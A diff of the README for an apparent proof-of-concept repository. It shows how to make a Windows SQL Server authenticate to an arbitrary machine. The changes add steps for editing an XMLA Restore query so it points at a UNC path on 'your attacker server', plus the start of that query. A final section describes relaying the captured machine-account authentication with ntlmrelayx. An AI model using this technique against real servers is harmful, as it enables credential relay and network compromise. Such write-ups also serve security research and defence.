@@ -4,9 +4,6 @@ A technique to coerce a Windows SQL Server to authenticate on an arbitrary machi
 
 This proof of concept is co-authored by <a href="https://twitter.com/intent/follow?screen_name=podalirius_" title="Follow"><img src="https://img.shields.io/twitter/follow/podalirius_?label=Podalirius&style=social"></a> and <a href="https://twitter.com/intent/follow?screen_name=_Worty" title="Follow"><img src="https://img.shields.io/twitter/follow/_Worty?label=Worty&style=social"></a>.
 
-## Introduction
-
-
 
 ## Proof of concept
 
@@ -18,15 +15,15 @@ Then we will select "Restore" to restore the database from a given file.
 
 ![](./.github/restore_db.png)
 
-Then
+To generate the XMLA file, put the path to a random file in the "Backup File" form, and click Ok.
 
 ![](./.github/accessed_xml_script.png)
 
-Then
+Then change the path to a random file and replace it with a UNC path to your attacker server (for example `\\192.168.128\SYSVOL\db.abf`)
 
 ![](./.github/unc_path_in_xml_file.png)
 
-Proof of concept ([poc.xmla](./poc.xmla)):
+Proof of concept XMLA query ([poc.xmla](./poc.xmla)):
 
 ```xml
 <Restore xmlns="http://schemas.microsoft.com/analysisservices/2003/engine">
@@ -41,8 +38,6 @@ And we get an authentication from the local machine account of the SQL Server:
 ![](./.github/responder_auth.png)
 
 ## Relaying for the win
-
-![](./.github/responder_auth.png)
 
 Once we got the authentification, we can relay it with `ntlmrelayx` to perform many actions on behalf of the computer `SQL01$`.
 
